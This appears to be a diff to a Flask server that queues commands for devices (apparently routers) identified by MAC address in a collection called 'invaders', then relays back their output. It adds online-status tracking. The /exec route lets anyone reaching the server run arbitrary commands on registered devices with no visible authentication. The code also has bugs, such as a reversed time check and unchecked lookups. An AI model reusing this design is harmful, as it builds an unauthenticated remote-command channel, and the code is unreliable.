@@ -1,10 +1,10 @@
 #!/home/yogi/flaskk/yogi/bin/python
 
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, url_for, redirect
 from datetime import datetime, timedelta
 import random
 from database import Database
-from pretty import Pretty
+from pretty import Pretty, statuss
 from commands import Commands
 
 app = Flask(__name__)
@@ -26,34 +26,37 @@ def hello():
     data = Database.find_one('invaders', {'mac': request_data['mac']})
 
     if data is not None:
+        Database.update('invaders', query={'mac': request_data['mac']}, data={"$set": {'reporte': datetime.now()}})
         if 'token' in request_data:
             base = Database.find_one('invaders', {'mac': request_data['mac'], 'commands.token': request_data['token']})
             if base is not None:
-                Database.update('invaders', (
-                    {'mac': request_data['mac']
-                        , 'commands.token': request_data['token']},
-                    {"$set": {"commands.$.response": request_data['response']}}))
-                Database.update('invaders', (
-                    {'mac': request_data['mac']
-                        , 'commands.token': request_data['token']}, {"$set": {"commands.$.tag": 'true'}}))
+                Database.update('invaders',
+                    query= {'mac': request_data['mac'], 'commands.token': request_data['token']},
+                    data= {"$set": {"commands.$.response": request_data['response']}})
+                Database.update('invaders',
+                    query= {'mac': request_data['mac'], 'commands.token': request_data['token']},
+                    data= {"$set": {"commands.$.tag": 'true'}})
 
-        request_data = {'mac': request_data['mac']}
-        rev = Database.find('invaders', {'mac': request_data['mac'], 'commands.serve': 'true'})
+        requeste = {'mac': request_data['mac']}
+        print(request_data['mac'])
+        rev = Database.find_one('invaders', {'mac': request_data['mac'], 'commands.serve': 'true'})
+
         if rev is not None:
             randie = rev['commands']
+            print(randie)
             for i in randie:
                 if i['serve'] == 'true':
                     rrr = i['token']
                     jjj = i['command']
                     print(rrr)
                     print(jjj)
-                    request_data = {'mac': rev['mac'], 'token': rrr, 'command': jjj}
-                    Database.update('invaders', (
-                        {'mac': rev['mac']
-                            , 'commands.token': i['token']}, {"$set": {"commands.$.serve": 'mild'}}))
+                    requeste = {'mac': rev['mac'], 'token': rrr, 'command': jjj}
+                    Database.update('invaders',
+                        query= {'mac': rev['mac'], 'commands.token': i['token']},
+                        data= {"$set": {"commands.$.serve": 'mild'}})
                     break
-        print(request_data)
-        return jsonify(request_data)
+        print(requeste)
+        return jsonify(requeste)
 
     # if 'token' in request_data:
     #     for i in ro:
@@ -93,26 +96,44 @@ def exec(mac):
     if data is not None:
         rand = random.randint(1000, 9999)
         print(rand)
-        josn = Commands(mac=mac, token=rand, serve='true', command=request_data['command'], tag='false', response=''}
-        josn.save_to_mongo()
-        print('saved to mongo')
+        statuse = statuss(data)
+        print(statuse)
+        if statuse:
+            print('url_for is working')
+            josn = Commands(mac=mac, token=rand, serve='true', command=request_data['command'], tag='false', response='')
+            josn.save_to_mongo()
+        else:
+            return jsonify({'output': 'router is offline'})
 
         a = datetime.now()
         b = timedelta(seconds=30)
         c = a + b
         while datetime.now() < c:
-            r = Database.find('invaders', {'mac': mac, 'commands.token': rand, 'commands.tag': 'true'})
-            while r is not None:
-                print(r['mac'])
-                randie = r['commands']
-                for i in randie:
-                    if i['token'] == rand:
-                        response = i['response']
-                        Database.update({'mac': mac}, {'$pull': {'commands': {'token': rand}}})
-                        return jsonify(response)
+            r = Database.find_one('invaders', {'mac': mac, 'commands.token': rand, 'commands.tag': 'true'})
+            randie = r['commands']
+            for i in randie:
+                if i['token'] == rand and i['tag'] == 'true':
+                    response = i['response']
+                    print('horrible')
+                    print(response)
+                    Database.update('invaders', query={'mac': mac},
+                                    data={'$pull': {'commands': {'token': rand}}})
+                    return jsonify(response)
+
+
+            # while r is not None:
+            #     print(r['mac'])
+            #     randie = r['commands']
+            #     for i in randie:
+            #         if i['token'] == rand:
+            #             response = i['response']
+            #             print('horrible')
+            #             print(response)
+            #             Database.update('invaders',query={'mac': mac}, data= {'$pull': {'commands': {'token': rand}}})
+            #             return jsonify(response)
         #
-        Database.update({'mac': mac}, {'$pull': {'commands': {'token': rand}}})
-        print('server timeout for' + rand)
+        Database.update('invaders',query= {'mac': mac}, data= {'$pull': {'commands': {'token': rand}}})
+        print('server timeout for' + str(rand))
         return jsonify({'output': 'server time out or server busy'})
     return jsonify({'output': 'unable to find with that mac'})
 
@@ -161,11 +182,30 @@ def registerget(mac):
     data = Database.find_one('invaders', {'mac': mac})
     if data is not None:
         print(data['mac'])
-        randie = data['commands']
-        for i in randie:
-            print(i)
+        #randie = data['commands']
+        # for i in randie:
+        #     print(i)
         return {"message": "Exists"}
-    return {"message": "Doesn't Exists"}
+    return {"message": "MAC Doesn't Exists or not registered"}
+
+
+@app.route('/wheel/status/<string:mac>', methods=['GET'])    # checks against mac for offline or online
+def status(mac):
+    data = Database.find_one('invaders', {'mac': mac})
+    if data is not None:
+        deadline = 60
+        print(data['mac'])
+        print(data['reporte'])
+        d = data['reporte']
+        e = datetime.now()
+        f = d-e
+        g = int(f.total_seconds())
+        if g<=deadline:
+            return True
+        else:
+            return False
+    return {"message": "MAC Doesn't Exists or not registered"}
+
 
 
 if __name__ == '__main__':
